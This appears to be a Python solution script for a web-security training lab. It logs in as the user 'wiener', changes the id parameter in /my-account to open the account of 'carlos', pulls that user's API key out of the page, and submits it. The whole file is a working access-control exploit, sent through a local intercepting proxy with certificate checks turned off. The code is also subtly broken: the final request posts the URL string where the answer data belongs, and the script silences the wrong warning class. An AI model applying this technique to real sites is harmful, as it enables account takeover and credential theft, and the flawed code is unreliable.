import requests
import sys
from bs4 import BeautifulSoup
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def get_csrf_token(s,url):
    r=s.get(url,verify=False,proxies=proxies)
    soup=BeautifulSoup(r.text,'html.parser')
    csrf=soup.find("input",{'name':'csrf'})['value']
    return csrf

def modify_user_name(s,url):
    #login as the user wiener
    login_url=url+"/login"
    #get csrf token from login page
    csrf_token=get_csrf_token(s,login_url)
    #now the data while login as the user wiener
    data_login={'csrf':csrf_token,'username':'wiener','password':'peter'}
    #now next step is to perform the request to login as wiener
    r=s.post(login_url,data=data_login,verify=False,proxies=proxies)
    #now I will put this is in response
    res=r.text
    #now I will check for some word in a response
    if "Your username is: wiener" in res:
        print("(+)Successfully logged in as a user winer")
        
        # If I am able to login then I have to change username carlos from the wiener let's do it
        change_username=url+"/my-account?id=carlos"
        #perfom a request this time a get request is performed
        r=s.get(change_username,verify=False,proxies=proxies)
        #put this is in a response
        res=r.text
        if "Your username is: carlos" in res:
            print("(+)Congrats you are logged in as carlos")
            print("(**)Retrieving the API KEY of carlos.........")

            api_key=re.search("Your API Key is:(.*)",res).group(1)
            print(api_key)
            #submit the api key
            submit_api=url+"/submitSolution"
            submit_data={'answer':api_key}
            r=s.post(submit_api,data=submit_api,verify=False,proxies=proxies)
            res=r.text 
            if "Congratulations" in res:
                print("(+)Congratulations you successfully solve the lab")
            else:
                print("(-)The lab didnot solved")
                sys.exit(-1)
                
            
                
    else:
        print("(-)Could not logged in as a user wiener")  
        sys.exit(-1)  


def main():
    if len(sys.argv)!=2:
        print("(+)Usage %s <url>" % sys.argv[0])
        print("(+)Example %s www.example.com" % sys.argv[0])
    else:
        s=requests.Session()    
        url=sys.argv[1]
        modify_user_name(s,url) #this is to modify carlos in place of wiener


if __name__=="__main__":
    main()